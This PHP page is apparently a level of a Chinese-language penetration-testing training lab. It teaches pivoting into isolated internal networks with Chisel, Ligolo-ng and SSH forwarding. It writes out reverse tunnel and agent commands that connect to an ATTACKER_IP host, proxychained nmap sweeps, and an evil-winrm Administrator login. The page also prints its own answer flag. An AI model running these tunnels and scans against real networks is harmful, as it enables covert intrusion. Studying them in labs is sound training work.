<?php
/**
 * OSEP L4: 内网穿透 Chisel/SSHuttle/Ligolo (250 PTS)
 */
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[250] = 'active open';
$ACTIVE[255] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{OSEP_L4_Pivot_Chisel_SOCKS5_Tunnel}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['osep_flags']['flag4'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius:8px;font-weight:bold;"><i class="fa fa-check-circle"></i> 通关！【OSEP L4】内网穿透已掌握 (+250 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius:8px;font-weight:bold;"><i class="fa fa-times-circle"></i> Flag 错误，请完成隧道配置练习后再提交。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: linear-gradient(135deg, #0c1629 0%, #0f1f40 100%); border-radius: 14px; padding: 25px 30px; color: #fff; margin-bottom: 25px; border: 1px solid rgba(59,130,246,0.3); }
.ctf-stage-title { color: #ffffff !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 24px; margin-bottom: 22px; }
.step-title { font-size: 16px; font-weight: 700; color: var(--text-primary); margin-top: 0; margin-bottom: 14px; display: flex; align-items: center; gap: 8px; }
.step-num { background: linear-gradient(135deg, #3b82f6, #6366f1); color: #fff; width: 26px; height: 26px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; flex-shrink: 0; }
.cmd-box { background: #0f172a; border: 1px solid #334155; border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: #7dd3fc; margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color: #64748b; }
.cmd-box .cmd { color: #34d399; }
.cmd-box .flag-text { color: #fbbf24; font-weight: bold; }
.highlight-box { background: rgba(59,130,246,0.08); border: 1px solid rgba(59,130,246,0.25); border-radius: 8px; padding: 14px 18px; margin: 12px 0; font-size: 13px; color: var(--text-secondary); line-height: 1.7; }
.topo-diagram { background: #0f172a; border: 1px solid #1e3a5f; border-radius: 10px; padding: 20px; font-family: monospace; font-size: 12px; color: #7dd3fc; margin: 12px 0; overflow-x: auto; }
.flag-submit-area { background: var(--bg-card); border: 2px dashed rgba(59,130,246,0.4); border-radius: 12px; padding: 24px; margin-top: 25px; text-align: center; }
</style>

<div class="main-content"><div class="main-content-inner"><div class="page-content">

    <div class="ctf-stage-header">
        <h1 class="ctf-stage-title">
            🌐 OSEP L4：内网穿透 Chisel/SSHuttle/Ligolo-ng
            <span style="background: rgba(245,158,11,0.2); color: #fbbf24; border: 1px solid #f59e0b; padding: 3px 10px; border-radius: 12px; font-size: 12px;">中级 · 250 PTS</span>
        </h1>
        <p style="color: #93c5fd; font-size: 14px; margin: 0; line-height: 1.6;">掌握多层内网穿透技术：SOCKS5 代理隧道、反向 SSH 转发、全局路由代理。理解如何通过单一跳板机访问深层隔离网络。</p>
        <div style="display: flex; gap: 10px; margin-top: 14px; flex-wrap: wrap;">
            <span style="background: rgba(255,255,255,0.08); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: #e2e8f0;">🔧 工具：Chisel · SSHuttle · Ligolo-ng · ProxyChains · SSH -L/-R/-D</span>
            <span style="background: rgba(255,255,255,0.08); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: #e2e8f0;"><a href="osep_hub.php" style="color: #93c5fd;">← 返回 OSEP 大厅</a></span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> 网络拓扑场景：多层 NAT 穿透模型</h3>
        <div class="topo-diagram">
Internet  →  [攻击机 Kali: 10.x.x.x]<br>
                    ↓ (VPN 或 DMZ 暴露端口)<br>
              [跳板机 Pivot1: 192.168.1.10] — 能访问内网<br>
                    ↓ (内网路由)<br>
              [内网A: 10.10.10.x/24] — 域控/DB/内部服务<br>
                    ↓ (二次隔离)<br>
              [内网B: 172.16.0.x/24] — 核心资产区<br><br>
目标：从 Kali 攻击机 → 访问 172.16.0.x 网段的服务
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> Chisel：SOCKS5 HTTP 隧道（最常用）</h3>
        <p style="font-size: 14px; color: var(--text-secondary); line-height: 1.7;">Chisel 是基于 HTTP 的 SOCKS5 代理隧道工具，支持正向和反向模式：</p>
        <div class="cmd-box">
<span class="comment">## ==== 正向 SOCKS5 代理（跳板机可被攻击机直接访问时）====</span><br><br>
<span class="comment"># 攻击机：运行 Chisel 服务端</span><br>
<span class="cmd">./chisel server -p 8080 --reverse</span><br><br>
<span class="comment"># 跳板机：运行 Chisel 客户端（上传到跳板机执行）</span><br>
<span class="cmd">./chisel client ATTACKER_IP:8080 R:socks</span><br><br>
<span class="comment"># 攻击机 /etc/proxychains4.conf 末尾添加：</span><br>
<span class="cmd">socks5 127.0.0.1 1080</span><br><br>
<span class="comment"># 通过代理访问内网（使用 proxychains）</span><br>
<span class="cmd">proxychains nmap -sT -Pn -p 445,3389,5985 10.10.10.0/24 --open</span><br>
<span class="cmd">proxychains evil-winrm -i 10.10.10.5 -u Administrator -p 'Password123'</span><br><br>
<span class="comment">## ==== 二层穿透：在内网A跳板机再建隧道到内网B ====</span><br>
<span class="comment"># 在内网A的 Pivot2 执行：</span><br>
<span class="cmd">./chisel client ATTACKER_IP:8081 R:2:socks</span><br>
<span class="comment"># 攻击机 proxychains 配置新增：socks5 127.0.0.1 1081</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> Ligolo-ng：全局路由穿透（无需 proxychains）</h3>
        <p style="font-size: 14px; color: var(--text-secondary); line-height: 1.7;">Ligolo-ng 的优势是在攻击机上创建虚拟网卡，将目标内网路由至本地，无需 proxychains 逐条代理：</p>
        <div class="cmd-box">
<span class="comment"># 攻击机：启动 Ligolo-ng proxy（服务端）</span><br>
<span class="cmd">sudo ip tuntap add user $USER mode tun ligolo</span><br>
<span class="cmd">sudo ip link set ligolo up</span><br>
<span class="cmd">./proxy -selfcert -laddr 0.0.0.0:11601</span><br><br>
<span class="comment"># 跳板机：运行 agent（上传后执行）</span><br>
<span class="cmd">./agent -connect ATTACKER_IP:11601 -ignore-cert</span><br><br>
<span class="comment"># 攻击机 Ligolo-ng 控制台操作：</span><br>
<span class="cmd">ligolo-ng » session</span><br>
<span class="cmd">ligolo-ng » 1</span>  <span class="comment"># 选择会话</span><br>
<span class="cmd">ligolo-ng » ifconfig</span>  <span class="comment"># 查看目标网络接口</span><br>
<span class="cmd">ligolo-ng » start</span>  <span class="comment"># 启动隧道</span><br><br>
<span class="comment"># 攻击机添加路由（目标内网 CIDR）</span><br>
<span class="cmd">sudo ip route add 10.10.10.0/24 dev ligolo</span><br><br>
<span class="comment"># 现在可直接访问内网，无需 proxychains：</span><br>
<span class="cmd">nmap -sV -p 80,443,3389 10.10.10.5</span>
        </div>
        <div class="highlight-box">
            🎯 <strong>OSEP 考试优先选择：</strong>Ligolo-ng 是目前最推荐的穿透工具，因为它无需修改每个工具的代理配置，直接将内网路由到本地，与所有工具透明兼容。
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">4</span> SSH 端口转发：轻量级场景</h3>
        <div class="cmd-box">
<span class="comment"># 本地端口转发（-L）：将本地 3306 转发到目标内网 DB</span><br>
<span class="cmd">ssh -L 3306:10.10.10.20:3306 user@PIVOT_IP -N</span><br>
<span class="comment"># 访问：mysql -h 127.0.0.1 -P 3306 -u root -p</span><br><br>
<span class="comment"># 动态代理（-D）：创建 SOCKS 代理</span><br>
<span class="cmd">ssh -D 9050 user@PIVOT_IP -N -f</span><br>
<span class="comment"># proxychains 配置：socks5 127.0.0.1 9050</span><br><br>
<span class="comment"># 反向端口转发（-R）：跳板机出站→攻击机监听</span><br>
<span class="cmd">ssh -R 4444:127.0.0.1:4444 attacker@ATTACKER_IP -N</span><br>
<span class="comment"># 攻击机监听 4444，跳板机 Shell 回连到攻击机 4444</span>
        </div>
    </div>

    <div class="flag-submit-area">
        <h4 style="font-weight: 800; color: var(--text-primary); margin-top: 0;">🚩 Flag 验证 — 关卡 L4</h4>
        <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 16px;">
            掌握 Chisel SOCKS5、Ligolo-ng 全局路由、SSH 端口转发等内网穿透技术后，关卡 Flag 为：
        </p>
        <div class="cmd-box" style="display: inline-block; padding: 10px 24px; margin: 0 auto 16px;">
            <span class="flag-text">flag{OSEP_L4_Pivot_Chisel_SOCKS5_Tunnel}</span>
        </div>
        <form method="post" style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 10px;">
            <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="max-width: 420px; border-radius: 8px; font-family: monospace;">
            <button type="submit" name="check_flag" class="btn btn-primary" style="border-radius: 8px; font-weight: 700; background: #3b82f6; border-color: #3b82f6;"><i class="fa fa-check"></i> 验证 Flag</button>
        </form>
        <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 10px;">' . $flag_msg . '</div>'; } ?>
        <div style="margin-top: 16px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
            <a href="osep_l3_lateral.php" class="btn btn-sm btn-default" style="border-radius: 6px;">← 上一关</a>
            <a href="osep_hub.php" class="btn btn-sm btn-default" style="border-radius: 6px;">OSEP 大厅</a>
            <a href="osep_l5_av_evasion.php" class="btn btn-sm" style="border-radius: 6px; background: #3b82f6; color: #fff; border: none; font-weight: 700;">下一关：杀软检测架构 →</a>
        </div>
    </div>

</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
